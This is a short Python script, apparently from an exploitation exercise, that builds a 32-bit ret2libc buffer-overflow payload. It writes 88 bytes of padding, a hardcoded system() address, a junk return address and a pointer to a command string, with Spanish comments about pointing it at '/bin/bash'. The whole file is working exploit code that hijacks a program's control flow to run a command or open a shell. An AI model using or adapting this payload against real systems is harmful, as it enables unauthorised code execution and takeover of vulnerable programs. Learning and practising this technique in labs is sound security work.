#!/usr/bin/env python3
import struct
import sys

offset = 88  # cc9c - cc44 -> 58 to decimal is 88
binbash_offset = 12  # system_addr + exit_addr + command_addr
junk = 0xDEADDEAD  # 0xF7DA4AD0  # exit()

system_addr = 0xF7DB8220
ls_addr = 0xF7F2A941

payload = b"A" * offset
payload += struct.pack("<I", system_addr)
payload += struct.pack("<I", junk)
payload += struct.pack("<I", ls_addr)
# binbash_addr  # Esta dirección apunta a la siguiente de si misma, es decir, a la dirección de la cadena "/bin/bash"
# payload += b"/bin/bash"
sys.stdout.buffer.write(payload)
